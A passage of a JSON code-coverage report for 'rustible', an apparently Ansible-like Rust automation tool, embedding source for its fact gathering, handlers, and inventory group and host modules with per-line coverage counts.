"line":1363,"address":[],"length":0,"stats":{"Line":0}},{"line":1364,"address":[],"length":0,"stats":{"Line":0}}],"covered":94,"coverable":532},{"path":["/","home","artur","Repositories","rustible","src","facts.rs"],"content":"//! System facts gathering for Rustible\n\nuse indexmap::IndexMap;\nuse serde::{Deserialize, Serialize};\n\n/// Facts gathered from a host\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\npub struct Facts {\n    data: IndexMap\u003cString, serde_json::Value\u003e,\n}\n\nimpl Facts {\n    /// Create empty facts\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Set a fact\n    pub fn set(\u0026mut self, key: impl Into\u003cString\u003e, value: serde_json::Value) {\n        self.data.insert(key.into(), value);\n    }\n\n    /// Get a fact\n    pub fn get(\u0026self, key: \u0026str) -\u003e Option\u003c\u0026serde_json::Value\u003e {\n        self.data.get(key)\n    }\n\n    /// Get all facts\n    pub fn all(\u0026self) -\u003e \u0026IndexMap\u003cString, serde_json::Value\u003e {\n        \u0026self.data\n    }\n\n    /// Gather local system facts\n    pub fn gather_local() -\u003e Self {\n        let mut facts = Self::new();\n\n        // OS info\n        facts.set(\"os_family\", serde_json::json!(std::env::consts::OS));\n        facts.set(\"os_arch\", serde_json::json!(std::env::consts::ARCH));\n\n        // Hostname\n        if let Ok(hostname) = hostname::get() {\n            facts.set(\"hostname\", serde_json::json!(hostname.to_string_lossy()));\n        }\n\n        // User\n        if let Ok(user) = std::env::var(\"USER\") {\n            facts.set(\"user\", serde_json::json!(user));\n        }\n\n        facts\n    }\n}\n","traces":[{"line":14,"address":[30707584],"length":1,"stats":{"Line":1}},{"line":15,"address":[30707592],"length":1,"stats":{"Line":1}},{"line":19,"address":[23608608,23608820,23608791],"length":1,"stats":{"Line":1}},{"line":20,"address":[23608723,23608649],"length":1,"stats":{"Line":2}},{"line":24,"address":[30707552],"length":1,"stats":{"Line":0}},{"line":25,"address":[30707570],"length":1,"stats":{"Line":0}},{"line":29,"address":[30707536],"length":1,"stats":{"Line":1}},{"line":34,"address":[30707518,30707110,30706416],"length":1,"stats":{"Line":0}},{"line":35,"address":[30706438],"length":1,"stats":{"Line":0}},{"line":38,"address":[30706502,30706443],"length":1,"stats":{"Line":0}},{"line":39,"address":[30706562],"length":1,"stats":{"Line":0}},{"line":42,"address":[30706650,30706752],"length":1,"stats":{"Line":0}},{"line":43,"address":[30706792,30706869],"length":1,"stats":{"Line":0}},{"line":47,"address":[30707149,30707217],"length":1,"stats":{"Line":0}},{"line":48,"address":[30707317,30707249],"length":1,"stats":{"Line":0}},{"line":51,"address":[30707490],"length":1,"stats":{"Line":0}}],"covered":5,"coverable":16},{"path":["/","home","artur","Repositories","rustible","src","handlers.rs"],"content":"//! Handler definitions for Rustible\n\nuse serde::{Deserialize, Serialize};\n\n/// A handler that can be notified by tasks\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Handler {\n    /// Handler name\n    pub name: String,\n    /// Module to execute\n    pub module: String,\n    /// Module arguments\n    #[serde(default)]\n    pub args: std::collections::HashMap\u003cString, serde_json::Value\u003e,\n    /// Optional when condition\n    pub when: Option\u003cString\u003e,\n}\n\nimpl Handler {\n    /// Create a new handler\n    pub fn new(name: impl Into\u003cString\u003e, module: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            module: module.into(),\n            args: std::collections::HashMap::new(),\n            when: None,\n        }\n    }\n}\n","traces":[{"line":21,"address":[],"length":0,"stats":{"Line":0}},{"line":23,"address":[],"length":0,"stats":{"Line":0}},{"line":24,"address":[],"length":0,"stats":{"Line":0}},{"line":25,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":4},{"path":["/","home","artur","Repositories","rustible","src","inventory","group.rs"],"content":"//! Group definition for Rustible inventory system.\n//!\n//! This module provides the `Group` structure representing a logical grouping\n//! of hosts with shared variables and parent-child relationships.\n\nuse indexmap::IndexMap;\nuse serde::{Deserialize, Serialize};\nuse std::collections::HashSet;\n\n/// A group of hosts in the inventory\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Group {\n    /// Group name\n    pub name: String,\n\n    /// Host names belonging to this group\n    #[serde(default)]\n    pub hosts: HashSet\u003cString\u003e,\n\n    /// Child group names\n    #[serde(default)]\n    pub children: HashSet\u003cString\u003e,\n\n    /// Parent group names (computed from children relationships)\n    #[serde(skip)]\n    pub parents: HashSet\u003cString\u003e,\n\n    /// Group-specific variables\n    #[serde(default)]\n    pub vars: IndexMap\u003cString, serde_yaml::Value\u003e,\n\n    /// Priority for variable precedence (higher = more priority)\n    #[serde(default)]\n    pub priority: i32,\n}\n\nimpl Group {\n    /// Create a new group with the given name\n    pub fn new(name: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            hosts: HashSet::new(),\n            children: HashSet::new(),\n            parents: HashSet::new(),\n            vars: IndexMap::new(),\n            priority: 0,\n        }\n    }\n\n    /// Create the special \"all\" group\n    pub fn all() -\u003e Self {\n        Self::new(\"all\")\n    }\n\n    /// Create the special \"ungrouped\" group\n    pub fn ungrouped() -\u003e Self {\n        Self::new(\"ungrouped\")\n    }\n\n    /// Add a host to this group\n    pub fn add_host(\u0026mut self, host: impl Into\u003cString\u003e) {\n        self.hosts.insert(host.into());\n    }\n\n    /// Remove a host from this group\n    pub fn remove_host(\u0026mut self, host: \u0026str) -\u003e bool {\n        self.hosts.remove(host)\n    }\n\n    /// Check if a host belongs to this group\n    pub fn has_host(\u0026self, host: \u0026str) -\u003e bool {\n        self.hosts.contains(host)\n    }\n\n    /// Add a child group\n    pub fn add_child(\u0026mut self, child: impl Into\u003cString\u003e) {\n        self.children.insert(child.into());\n    }\n\n    /// Remove a child group\n    pub fn remove_child(\u0026mut self, child: \u0026str) -\u003e bool {\n        self.children.remove(child)\n    }\n\n    /// Check if a group is a child of this group\n    pub fn has_child(\u0026self, child: \u0026str) -\u003e bool {\n        self.children.contains(child)\n    }\n\n    /// Add a parent group (internal use for reverse lookups)\n    pub fn add_parent(\u0026mut self, parent: impl Into\u003cString\u003e) {\n        self.parents.insert(parent.into());\n    }\n\n    /// Remove a parent group\n    pub fn remove_parent(\u0026mut self, parent: \u0026str) -\u003e bool {\n        self.parents.remove(parent)\n    }\n\n    /// Check if a group is a parent of this group\n    pub fn has_parent(\u0026self, parent: \u0026str) -\u003e bool {\n        self.parents.contains(parent)\n    }\n\n    /// Set a variable on this group\n    pub fn set_var(\u0026mut self, key: impl Into\u003cString\u003e, value: serde_yaml::Value) {\n        self.vars.insert(key.into(), value);\n    }\n\n    /// Get a variable from this group\n    pub fn get_var(\u0026self, key: \u0026str) -\u003e Option\u003c\u0026serde_yaml::Value\u003e {\n        self.vars.get(key)\n    }\n\n    /// Check if group has a specific variable\n    pub fn has_var(\u0026self, key: \u0026str) -\u003e bool {\n        self.vars.contains_key(key)\n    }\n\n    /// Get all host names (direct members only, not from child groups)\n    pub fn direct_hosts(\u0026self) -\u003e impl Iterator\u003cItem = \u0026String\u003e {\n        self.hosts.iter()\n    }\n\n    /// Get all child group names\n    pub fn child_groups(\u0026self) -\u003e impl Iterator\u003cItem = \u0026String\u003e {\n        self.children.iter()\n    }\n\n    /// Get all parent group names\n    pub fn parent_groups(\u0026self) -\u003e impl Iterator\u003cItem = \u0026String\u003e {\n        self.parents.iter()\n    }\n\n    /// Check if this group is empty (no hosts and no children)\n    pub fn is_empty(\u0026self) -\u003e bool {\n        self.hosts.is_empty() \u0026\u0026 self.children.is_empty()\n    }\n\n    /// Get the number of direct host members\n    pub fn host_count(\u0026self) -\u003e usize {\n        self.hosts.len()\n    }\n\n    /// Get the number of child groups\n    pub fn child_count(\u0026self) -\u003e usize {\n        self.children.len()\n    }\n\n    /// Merge variables from another group (other takes precedence)\n    pub fn merge_vars(\u0026mut self, other: \u0026IndexMap\u003cString, serde_yaml::Value\u003e) {\n        for (key, value) in other {\n            self.vars.insert(key.clone(), value.clone());\n        }\n    }\n\n    /// Get depth in the group hierarchy (0 for \"all\", increases for each parent)\n    /// This is used for variable precedence calculations\n    pub fn depth(\u0026self) -\u003e usize {\n        self.parents.len()\n    }\n}\n\nimpl PartialEq for Group {\n    fn eq(\u0026self, other: \u0026Self) -\u003e bool {\n        self.name == other.name\n    }\n}\n\nimpl Eq for Group {}\n\nimpl std::hash::Hash for Group {\n    fn hash\u003cH: std::hash::Hasher\u003e(\u0026self, state: \u0026mut H) {\n        self.name.hash(state);\n    }\n}\n\nimpl std::fmt::Display for Group {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        write!(f, \"{} ({} hosts\", self.name, self.hosts.len())?;\n        if !self.children.is_empty() {\n            write!(f, \", {} children\", self.children.len())?;\n        }\n        write!(f, \")\")\n    }\n}\n\n/// Builder for creating groups with a fluent API\n#[derive(Debug, Default)]\npub struct GroupBuilder {\n    name: String,\n    hosts: HashSet\u003cString\u003e,\n    children: HashSet\u003cString\u003e,\n    vars: IndexMap\u003cString, serde_yaml::Value\u003e,\n    priority: i32,\n}\n\nimpl GroupBuilder {\n    /// Create a new group builder\n    pub fn new(name: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            ..Default::default()\n        }\n    }\n\n    /// Add a host to the group\n    pub fn host(mut self, host: impl Into\u003cString\u003e) -\u003e Self {\n        self.hosts.insert(host.into());\n        self\n    }\n\n    /// Add multiple hosts to the group\n    pub fn hosts\u003cI, S\u003e(mut self, hosts: I) -\u003e Self\n    where\n        I: IntoIterator\u003cItem = S\u003e,\n        S: Into\u003cString\u003e,\n    {\n        for host in hosts {\n            self.hosts.insert(host.into());\n        }\n        self\n    }\n\n    /// Add a child group\n    pub fn child(mut self, child: impl Into\u003cString\u003e) -\u003e Self {\n        self.children.insert(child.into());\n        self\n    }\n\n    /// Add multiple child groups\n    pub fn children\u003cI, S\u003e(mut self, children: I) -\u003e Self\n    where\n        I: IntoIterator\u003cItem = S\u003e,\n        S: Into\u003cString\u003e,\n    {\n        for child in children {\n            self.children.insert(child.into());\n        }\n        self\n    }\n\n    /// Add a variable\n    pub fn var(mut self, key: impl Into\u003cString\u003e, value: serde_yaml::Value) -\u003e Self {\n        self.vars.insert(key.into(), value);\n        self\n    }\n\n    /// Set the priority\n    pub fn priority(mut self, priority: i32) -\u003e Self {\n        self.priority = priority;\n        self\n    }\n\n    /// Build the group\n    pub fn build(self) -\u003e Group {\n        Group {\n            name: self.name,\n            hosts: self.hosts,\n            children: self.children,\n            parents: HashSet::new(),\n            vars: self.vars,\n            priority: self.priority,\n        }\n    }\n}\n\n/// Represents the group hierarchy for variable inheritance\n#[derive(Debug, Clone)]\npub struct GroupHierarchy {\n    /// Ordered list of groups from most specific to least specific (child to parent)\n    pub groups: Vec\u003cString\u003e,\n}\n\nimpl GroupHierarchy {\n    /// Create a new empty hierarchy\n    pub fn new() -\u003e Self {\n        Self { groups: Vec::new() }\n    }\n\n    /// Add a group to the hierarchy\n    pub fn push(\u0026mut self, group: impl Into\u003cString\u003e) {\n        self.groups.push(group.into());\n    }\n\n    /// Get groups in order from least specific to most specific (parent to child)\n    /// This is the order for variable application (later overrides earlier)\n    pub fn parent_to_child(\u0026self) -\u003e impl Iterator\u003cItem = \u0026String\u003e {\n        self.groups.iter().rev()\n    }\n\n    /// Get groups in order from most specific to least specific (child to parent)\n    pub fn child_to_parent(\u0026self) -\u003e impl Iterator\u003cItem = \u0026String\u003e {\n        self.groups.iter()\n    }\n}\n\nimpl Default for GroupHierarchy {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_group_new() {\n        let group = Group::new(\"webservers\");\n        assert_eq!(group.name, \"webservers\");\n        assert!(group.hosts.is_empty());\n        assert!(group.children.is_empty());\n        assert!(group.vars.is_empty());\n    }\n\n    #[test]\n    fn test_group_hosts() {\n        let mut group = Group::new(\"webservers\");\n        group.add_host(\"web1\");\n        group.add_host(\"web2\");\n        assert!(group.has_host(\"web1\"));\n        assert!(group.has_host(\"web2\"));\n        assert!(!group.has_host(\"db1\"));\n        assert_eq!(group.host_count(), 2);\n\n        group.remove_host(\"web1\");\n        assert!(!group.has_host(\"web1\"));\n        assert_eq!(group.host_count(), 1);\n    }\n\n    #[test]\n    fn test_group_children() {\n        let mut group = Group::new(\"production\");\n        group.add_child(\"webservers\");\n        group.add_child(\"databases\");\n        assert!(group.has_child(\"webservers\"));\n        assert!(group.has_child(\"databases\"));\n        assert_eq!(group.child_count(), 2);\n    }\n\n    #[test]\n    fn test_group_vars() {\n        let mut group = Group::new(\"webservers\");\n        group.set_var(\"http_port\", serde_yaml::Value::Number(80.into()));\n        assert!(group.has_var(\"http_port\"));\n        assert_eq!(\n            group.get_var(\"http_port\"),\n            Some(\u0026serde_yaml::Value::Number(80.into()))\n        );\n    }\n\n    #[test]\n    fn test_group_builder() {\n        let group = GroupBuilder::new(\"webservers\")\n            .hosts([\"web1\", \"web2\"])\n            .child(\"nginx\")\n            .var(\"http_port\", serde_yaml::Value::Number(80.into()))\n            .priority(10)\n            .build();\n\n        assert_eq!(group.name, \"webservers\");\n        assert!(group.has_host(\"web1\"));\n        assert!(group.has_host(\"web2\"));\n        assert!(group.has_child(\"nginx\"));\n        assert!(group.has_var(\"http_port\"));\n        assert_eq!(group.priority, 10);\n    }\n\n    #[test]\n    fn test_group_hierarchy() {\n        let mut hierarchy = GroupHierarchy::new();\n        hierarchy.push(\"all\");\n        hierarchy.push(\"production\");\n        hierarchy.push(\"webservers\");\n\n        let parent_to_child: Vec\u003c_\u003e = hierarchy.parent_to_child().collect();\n        assert_eq!(parent_to_child, vec![\"webservers\", \"production\", \"all\"]);\n\n        let child_to_parent: Vec\u003c_\u003e = hierarchy.child_to_parent().collect();\n        assert_eq!(child_to_parent, vec![\"all\", \"production\", \"webservers\"]);\n    }\n}\n","traces":[{"line":39,"address":[28453632,28454528,28454522,28454072,28454096,28454078],"length":1,"stats":{"Line":2}},{"line":41,"address":[28453665,28454120],"length":1,"stats":{"Line":2}},{"line":42,"address":[28453686,28454141],"length":1,"stats":{"Line":2}},{"line":43,"address":[28453743,28454198],"length":1,"stats":{"Line":2}},{"line":44,"address":[28453797,28454252],"length":1,"stats":{"Line":2}},{"line":45,"address":[28453862,28454317],"length":1,"stats":{"Line":2}},{"line":51,"address":[30243584],"length":1,"stats":{"Line":1}},{"line":52,"address":[30243592],"length":1,"stats":{"Line":1}},{"line":56,"address":[30243904],"length":1,"stats":{"Line":1}},{"line":57,"address":[30243912],"length":1,"stats":{"Line":1}},{"line":61,"address":[28455104,28455184],"length":1,"stats":{"Line":2}},{"line":62,"address":[28455193,28455123],"length":1,"stats":{"Line":2}},{"line":66,"address":[30243296],"length":1,"stats":{"Line":1}},{"line":67,"address":[30243314],"length":1,"stats":{"Line":1}},{"line":71,"address":[30243728],"length":1,"stats":{"Line":1}},{"line":72,"address":[30243746],"length":1,"stats":{"Line":1}},{"line":76,"address":[28455328,28455248],"length":1,"stats":{"Line":2}},{"line":77,"address":[28455267,28455337],"length":1,"stats":{"Line":2}},{"line":81,"address":[30243440],"length":1,"stats":{"Line":0}},{"line":82,"address":[30243458],"length":1,"stats":{"Line":0}},{"line":86,"address":[30243856],"length":1,"stats":{"Line":1}},{"line":87,"address":[30243874],"length":1,"stats":{"Line":1}},{"line":91,"address":[28453568],"length":1,"stats":{"Line":0}},{"line":92,"address":[28453577],"length":1,"stats":{"Line":0}},{"line":96,"address":[30243536],"length":1,"stats":{"Line":0}},{"line":97,"address":[30243554],"length":1,"stats":{"Line":0}},{"line":101,"address":[30242848],"length":1,"stats":{"Line":0}},{"line":102,"address":[30242866],"length":1,"stats":{"Line":0}},{"line":106,"address":[28455059,28455087,28454787,28454544,28454832,28454815],"length":1,"stats":{"Line":1}},{"line":107,"address":[28454851,28454677,28454949,28454579],"length":1,"stats":{"Line":2}},{"line":111,"address":[30243648],"length":1,"stats":{"Line":1}},{"line":112,"address":[30243666],"length":1,"stats":{"Line":1}},{"line":116,"address":[30243680],"length":1,"stats":{"Line":1}},{"line":117,"address":[30243698],"length":1,"stats":{"Line":1}},{"line":121,"address":[30243392],"length":1,"stats":{"Line":0}},{"line":122,"address":[30243409],"length":1,"stats":{"Line":0}},{"line":126,"address":[30243344],"length":1,"stats":{"Line":0}},{"line":127,"address":[30243361],"length":1,"stats":{"Line":0}},{"line":131,"address":[30243488],"length":1,"stats":{"Line":0}},{"line":132,"address":[30243505],"length":1,"stats":{"Line":0}},{"line":136,"address":[30243776],"length":1,"stats":{"Line":0}},{"line":137,"address":[30243789],"length":1,"stats":{"Line":0}},{"line":141,"address":[30242896],"length":1,"stats":{"Line":1}},{"line":142,"address":[30242901],"length":1,"stats":{"Line":1}},{"line":146,"address":[30243264],"length":1,"stats":{"Line":1}},{"line":147,"address":[30243269],"length":1,"stats":{"Line":1}},{"line":151,"address":[30243253,30242912,30243221],"length":1,"stats":{"Line":0}},{"line":152,"address":[30242976,30242953],"length":1,"stats":{"Line":0}},{"line":153,"address":[30243234,30243060,30243122],"length":1,"stats":{"Line":0}},{"line":159,"address":[30243616],"length":1,"stats":{"Line":0}},{"line":160,"address":[30243621],"length":1,"stats":{"Line":0}},{"line":165,"address":[30224416],"length":1,"stats":{"Line":0}},{"line":166,"address":[30224430],"length":1,"stats":{"Line":0}},{"line":173,"address":[],"length":0,"stats":{"Line":0}},{"line":174,"address":[],"length":0,"stats":{"Line":0}},{"line":179,"address":[30223904],"length":1,"stats":{"Line":0}},{"line":180,"address":[30223936],"length":1,"stats":{"Line":0}},{"line":181,"address":[30224145],"length":1,"stats":{"Line":0}},{"line":182,"address":[30224169,30224381],"length":1,"stats":{"Line":0}},{"line":184,"address":[30224334],"length":1,"stats":{"Line":0}},{"line":200,"address":[28452272,28452537,28452543],"length":1,"stats":{"Line":1}},{"line":202,"address":[28452305],"length":1,"stats":{"Line":1}},{"line":208,"address":[],"length":0,"stats":{"Line":0}},{"line":209,"address":[],"length":0,"stats":{"Line":0}},{"line":210,"address":[],"length":0,"stats":{"Line":0}},{"line":214,"address":[28453120,28453483],"length":1,"stats":{"Line":1}},{"line":219,"address":[28453160,28453204,28453290],"length":1,"stats":{"Line":3}},{"line":220,"address":[28453459,28453374],"length":1,"stats":{"Line":2}},{"line":222,"address":[28453431],"length":1,"stats":{"Line":1}},{"line":226,"address":[28453094,28452928],"length":1,"stats":{"Line":1}},{"line":227,"address":[28453048,28452981],"length":1,"stats":{"Line":2}},{"line":228,"address":[28453074],"length":1,"stats":{"Line":1}},{"line":237,"address":[],"length":0,"stats":{"Line":0}},{"line":238,"address":[],"length":0,"stats":{"Line":0}},{"line":240,"address":[],"length":0,"stats":{"Line":0}},{"line":244,"address":[28452560,28452903],"length":1,"stats":{"Line":1}},{"line":245,"address":[28452731,28452629],"length":1,"stats":{"Line":2}},{"line":246,"address":[28452852],"length":1,"stats":{"Line":1}},{"line":250,"address":[30242656],"length":1,"stats":{"Line":1}},{"line":251,"address":[30242672],"length":1,"stats":{"Line":1}},{"line":252,"address":[30242678],"length":1,"stats":{"Line":1}},{"line":256,"address":[30242583,30242208,30242637],"length":1,"stats":{"Line":1}},{"line":258,"address":[30242230],"length":1,"stats":{"Line":1}},{"line":259,"address":[30242247],"length":1,"stats":{"Line":1}},{"line":260,"address":[30242277],"length":1,"stats":{"Line":1}},{"line":261,"address":[30242319],"length":1,"stats":{"Line":1}},{"line":262,"address":[30242384],"length":1,"stats":{"Line":1}},{"line":263,"address":[30242416],"length":1,"stats":{"Line":1}},{"line":277,"address":[30242784],"length":1,"stats":{"Line":1}},{"line":278,"address":[30242797],"length":1,"stats":{"Line":1}},{"line":282,"address":[28453504],"length":1,"stats":{"Line":1}},{"line":283,"address":[28453527],"length":1,"stats":{"Line":1}},{"line":288,"address":[30242736],"length":1,"stats":{"Line":1}},{"line":289,"address":[30242741],"length":1,"stats":{"Line":1}},{"line":293,"address":[30242704],"length":1,"stats":{"Line":1}},{"line":294,"address":[30242709],"length":1,"stats":{"Line":1}},{"line":299,"address":[30225408],"length":1,"stats":{"Line":0}},{"line":300,"address":[30225416],"length":1,"stats":{"Line":0}}],"covered":60,"coverable":98},{"path":["/","home","artur","Repositories","rustible","src","inventory","host.rs"],"content":"//! Host definition for Rustible inventory system.\n//!\n//! This module provides the `Host` structure representing a managed node\n//! with connection parameters, variables, and group membership.\n\nuse indexmap::IndexMap;\nuse serde::{Deserialize, Serialize};\nuse std::collections::HashSet;\n\n/// Connection type for a host\n#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]\n#[serde(rename_all = \"lowercase\")]\npub enum ConnectionType {\n    /// SSH connection (default)\n    #[default]\n    Ssh,\n    /// Local connection (no SSH)\n    Local,\n    /// Docker container connection\n    Docker,\n    /// Podman container connection\n    Podman,\n    /// WinRM connection for Windows hosts\n    Winrm,\n}\n\nimpl std::fmt::Display for ConnectionType {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        match self {\n            ConnectionType::Ssh =\u003e write!(f, \"ssh\"),\n            ConnectionType::Local =\u003e write!(f, \"local\"),\n            ConnectionType::Docker =\u003e write!(f, \"docker\"),\n            ConnectionType::Podman =\u003e write!(f, \"podman\"),\n            ConnectionType::Winrm =\u003e write!(f, \"winrm\"),\n        }\n    }\n}\n\n/// SSH connection parameters\n#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]\npub struct SshParams {\n    /// SSH port (default: 22)\n    #[serde(default = \"default_ssh_port\")]\n    pub port: u16,\n\n    /// SSH user\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub user: Option\u003cString\u003e,\n\n    /// SSH private key file path\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub private_key_file: Option\u003cString\u003e,\n\n    /// SSH password (discouraged, use keys)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub password: Option\u003cString\u003e,\n\n    /// SSH common args\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub common_args: Option\u003cString\u003e,\n\n    /// SSH extra args\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub extra_args: Option\u003cString\u003e,\n\n    /// SSH executable path\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub executable: Option\u003cString\u003e,\n\n    /// SSH pipelining enabled\n    #[serde(default)]\n    pub pipelining: bool,\n\n    /// SSH host key checking\n    #[serde(default = \"default_host_key_checking\")]\n    pub host_key_checking: bool,\n\n    /// SSH connection timeout in seconds\n    #[serde(default = \"default_timeout\")]\n    pub timeout: u32,\n}\n\nfn default_ssh_port() -\u003e u16 {\n    22\n}\n\nfn default_host_key_checking() -\u003e bool {\n    true\n}\n\nfn default_timeout() -\u003e u32 {\n    10\n}\n\nimpl Default for SshParams {\n    fn default() -\u003e Self {\n        Self {\n            port: default_ssh_port(),\n            user: None,\n            private_key_file: None,\n            password: None,\n            common_args: None,\n            extra_args: None,\n            executable: None,\n            pipelining: false,\n            host_key_checking: default_host_key_checking(),\n            timeout: default_timeout(),\n        }\n    }\n}\n\n/// Connection parameters for a host\n#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]\npub struct ConnectionParams {\n    /// Connection type\n    #[serde(default)]\n    pub connection: ConnectionType,\n\n    /// SSH-specific parameters\n    #[serde(flatten)]\n    pub ssh: SshParams,\n\n    /// Become (privilege escalation) enabled\n    #[serde(default)]\n    pub r#become: bool,\n\n    /// Become method (sudo, su, etc.)\n    #[serde(default = \"default_become_method\")]\n    pub become_method: String,\n\n    /// Become user\n    #[serde(default = \"default_become_user\")]\n    pub become_user: String,\n\n    /// Become password\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub become_password: Option\u003cString\u003e,\n\n    /// Python interpreter path on remote host\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub python_interpreter: Option\u003cString\u003e,\n\n    /// Shell executable on remote host\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub shell_executable: Option\u003cString\u003e,\n}\n\nfn default_become_method() -\u003e String {\n    \"sudo\".to_string()\n}\n\nfn default_become_user() -\u003e String {\n    \"root\".to_string()\n}\n\nimpl Default for ConnectionParams {\n    fn default() -\u003e Self {\n        Self {\n            connection: ConnectionType::default(),\n            ssh: SshParams::default(),\n            r#become: false,\n            become_method: default_become_method(),\n            become_user: default_become_user(),\n            become_password: None,\n            python_interpreter: None,\n            shell_executable: None,\n        }\n    }\n}\n\n/// A managed host in the inventory\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Host {\n    /// Host name (can be hostname, IP, or alias)\n    pub name: String,\n\n    /// Actual hostname or IP to connect to (if different from name)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub ansible_host: Option\u003cString\u003e,\n\n    /// Connection parameters\n    #[serde(flatten)]\n    pub connection: ConnectionParams,\n\n    /// Host-specific variables\n    #[serde(default)]\n    pub vars: IndexMap\u003cString, serde_yaml::Value\u003e,\n\n    /// Groups this host belongs to\n    #[serde(skip)]\n    pub groups: HashSet\u003cString\u003e,\n\n    /// Whether the host is enabled\n    #[serde(default = \"default_enabled\")]\n    pub enabled: bool,\n}\n\nfn default_enabled() -\u003e bool {\n    true\n}\n\nimpl Host {\n    /// Create a new host with the given name\n    pub fn new(name: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            ansible_host: None,\n            connection: ConnectionParams::default(),\n            vars: IndexMap::new(),\n            groups: HashSet::new(),\n            enabled: true,\n        }\n    }\n\n    /// Create a new host with hostname/IP\n    pub fn with_address(name: impl Into\u003cString\u003e, address: impl Into\u003cString\u003e) -\u003e Self {\n        let mut host = Self::new(name);\n        host.ansible_host = Some(address.into());\n        host\n    }\n\n    /// Get the host name\n    pub fn name(\u0026self) -\u003e \u0026str {\n        \u0026self.name\n    }\n\n    /// Get the actual address to connect to\n    pub fn address(\u0026self) -\u003e \u0026str {\n        self.ansible_host.as_deref().unwrap_or(\u0026self.name)\n    }\n\n    /// Set a variable on this host\n    pub fn set_var(\u0026mut self, key: impl Into\u003cString\u003e, value: serde_yaml::Value) {\n        self.vars.insert(key.into(), value);\n    }\n\n    /// Get a variable from this host\n    pub fn get_var(\u0026self, key: \u0026str) -\u003e Option\u003c\u0026serde_yaml::Value\u003e {\n        self.vars.get(key)\n    }\n\n    /// Check if host has a specific variable\n    pub fn has_var(\u0026self, key: \u0026str) -\u003e bool {\n        self.vars.contains_key(key)\n    }\n\n    /// Add this host to a group\n    pub fn add_to_group(\u0026mut self, group: impl Into\u003cString\u003e) {\n        self.groups.insert(group.into());\n    }\n\n    /// Remove this host from a group\n    pub fn remove_from_group(\u0026mut self, group: \u0026str) {\n        self.groups.remove(group);\n    }\n\n    /// Check if host belongs to a specific group\n    pub fn in_group(\u0026self, group: \u0026str) -\u003e bool {\n        self.groups.contains(group)\n    }\n\n    /// Set SSH port\n    pub fn set_port(\u0026mut self, port: u16) {\n        self.connection.ssh.port = port;\n    }\n\n    /// Set SSH user\n    pub fn set_user(\u0026mut self, user: impl Into\u003cString\u003e) {\n        self.connection.ssh.user = Some(user.into());\n    }\n\n    /// Set SSH private key file\n    pub fn set_private_key(\u0026mut self, key_file: impl Into\u003cString\u003e) {\n        self.connection.ssh.private_key_file = Some(key_file.into());\n    }\n\n    /// Enable privilege escalation (become)\n    pub fn enable_become(\u0026mut self) {\n        self.connection.r#become = true;\n    }\n\n    /// Set become method\n    pub fn set_become_method(\u0026mut self, method: impl Into\u003cString\u003e) {\n        self.connection.become_method = method.into();\n    }\n\n    /// Set become user\n    pub fn set_become_user(\u0026mut self, user: impl Into\u003cString\u003e) {\n        self.connection.become_user = user.into();\n    }\n\n    /// Set connection type\n    pub fn set_connection(\u0026mut self, conn: ConnectionType) {\n        self.connection.connection = conn;\n    }\n\n    /// Merge variables from another source (other takes precedence)\n    pub fn merge_vars(\u0026mut self, other: \u0026IndexMap\u003cString, serde_yaml::Value\u003e) {\n        for (key, value) in other {\n            self.vars.insert(key.clone(), value.clone());\n        }\n    }\n\n    /// Parse host definition from string (e.g., \"host1 ansible_host=192.168.1.1 ansible_port=22\")\n    pub fn parse(input: \u0026str) -\u003e Result\u003cSelf, HostParseError\u003e {\n        let parts: Vec\u003c\u0026str\u003e = input.split_whitespace().collect();\n        if parts.is_empty() {\n            return Err(HostParseError::EmptyInput);\n        }\n\n        let name = parts[0].to_string();\n        let mut host = Host::new(name);\n\n        for part in \u0026parts[1..] {\n            if let Some((key, value)) = part.split_once('=') {\n                match key {\n                    \"ansible_host\" =\u003e host.ansible_host = Some(value.to_string()),\n                    \"ansible_port\" =\u003e {\n                        host.connection.ssh.port = value\n                            .parse()\n                            .map_err(|_| HostParseError::InvalidPort(value.to_string()))?;\n                    }\n                    \"ansible_user\" =\u003e host.connection.ssh.user = Some(value.to_string()),\n                    \"ansible_ssh_private_key_file\" =\u003e {\n                        host.connection.ssh.private_key_file = Some(value.to_string())\n                    }\n                    \"ansible_ssh_pass\" =\u003e host.connection.ssh.password = Some(value.to_string()),\n                    \"ansible_connection\" =\u003e {\n                        host.connection.connection = match value.to_lowercase().as_str() {\n                            \"ssh\" =\u003e ConnectionType::Ssh,\n                            \"local\" =\u003e ConnectionType::Local,\n                            \"docker\" =\u003e ConnectionType::Docker,\n                            \"podman\" =\u003e ConnectionType::Podman,\n                            \"winrm\" =\u003e ConnectionType::Winrm,\n                            _ =\u003e {\n                                return Err(HostParseError::InvalidConnectionType(\n                                    value.to_string(),\n                                ))\n                            }\n                        };\n                    }\n                    \"ansible_become\" =\u003e {\n                        host.connection.r#become = value.to_lowercase() == \"true\" || value 